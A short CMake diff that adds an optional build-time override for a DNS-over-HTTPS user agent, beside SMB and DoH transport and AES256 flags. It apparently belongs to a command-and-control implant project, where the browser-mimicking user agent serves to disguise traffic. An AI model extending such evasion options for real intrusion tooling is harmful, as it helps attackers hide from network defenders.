@@ -110,8 +110,11 @@ add_compile_definitions( TRANSPORT_SMB )
 add_compile_definitions( TRANSPORT_DOH )
 
 # DoH User-Agent: override the default Chrome UA by passing
-#   -DARCHON_DOH_USER_AGENT="Mozilla/5.0 ..." to cmake or the compiler.
+#   -DARCHON_DOH_USER_AGENT="Mozilla/5.0 ..." to cmake.
 # The default is defined in include/common/Defines.h.
+if(DEFINED ARCHON_DOH_USER_AGENT)
+    add_compile_definitions(ARCHON_DOH_USER_AGENT="${ARCHON_DOH_USER_AGENT}")
+endif()
 add_compile_definitions( AES256 )
 
 # linking library
